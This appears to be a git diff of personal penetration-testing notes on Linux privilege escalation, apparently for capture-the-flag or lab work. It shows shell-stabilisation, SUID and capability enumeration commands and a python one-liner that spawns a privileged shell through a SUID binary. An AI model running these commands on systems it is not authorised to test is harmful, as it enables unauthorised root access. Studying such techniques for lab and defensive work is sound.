@@ -4,17 +4,18 @@ PROCESS:
 - Stablish Shell
 - Privilege Escalation
 - Maintain Access
+TOOLS
+- https://gtfobins.github.io/
 OUPUT: 
-- root Shell
+- root shell
 
 
-## Stablish Shell   
-[python]
-```sh
-python3 -c 'import pty;pty.spawn("/bin/bash");'; export TERM=xterm
-```
 
 ## Privilege Escalation
+getcap -r / 2>/dev/null
+
+
+
 [SUID] find / -perm /4000 2>/dev/null
     - [python] <python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'>
 [sudo] <id; sudo -l; sudo -V>
